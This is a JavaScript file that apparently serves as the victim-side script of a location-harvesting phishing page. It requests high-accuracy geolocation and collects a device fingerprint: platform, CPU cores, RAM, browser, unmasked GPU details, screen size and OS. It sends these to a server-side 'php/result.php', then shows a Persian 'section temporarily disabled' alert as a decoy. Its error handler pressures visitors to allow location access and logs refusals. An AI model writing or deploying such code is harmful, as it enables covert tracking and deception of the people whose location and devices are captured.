function locate()

{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  //gpu
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;
  //sysinfo
  console.log(ver);
  console.log(ptf);

  if (cc == undefined)
  {
    cc = 'Not Available';
    console.log('Cores are not available')
  }
  console.log(cc);
   
  //ram
  if (ram == undefined)
  {
    ram = 'Not Available';
    console.log('RAM is not available')
  }
  console.log(ram);

  //browser
  if (ver.indexOf('Firefox') != -1)
  {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else if (ver.indexOf('Chrome') != -1)
  {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else if (ver.indexOf('Safari') != -1)
  {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else if (ver.indexOf('Edge') != -1)
  {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else
  {
    brw = 'Not Available'
    console.log('Browser is not available')
  }

  //gpu
  try
  {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) {}
  if (gl)
  {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined)
  {
    ven = 'Not Available';
    console.log('GPU Vendor not available')
  }
  if (ren == undefined)
  {
    ren = 'Not Available';
    console.log('GPU Renderer not available')
  }
  console.log(ven);
  console.log(ren);
  //
  var ht = window.screen.height
  var wd = window.screen.width
  console.log(window.screen.height)
  console.log(window.screen.width)
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined)
  {
    os = 'Not Available';
    console.log('OS is not available')
  }
  os = os.trim();
  console.log(os);
  //


    

    var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = this.responseText;
    }
  };
  xhttp.open("POST", "php/result.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("Lat="+lat+"&Lon="+lon+"&Ptf="+ptf+"&Brw="+brw+"&Cc="+cc+"&Ram="+ram+"&Ven="+ven+"&Ren="+ren+"&Ht="+ht+"&Wd="+wd+"&Os="+os);
  alert('متاسفانه این بخش موقتا غیرفعال است')
  };

}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			var timeout = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'An unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
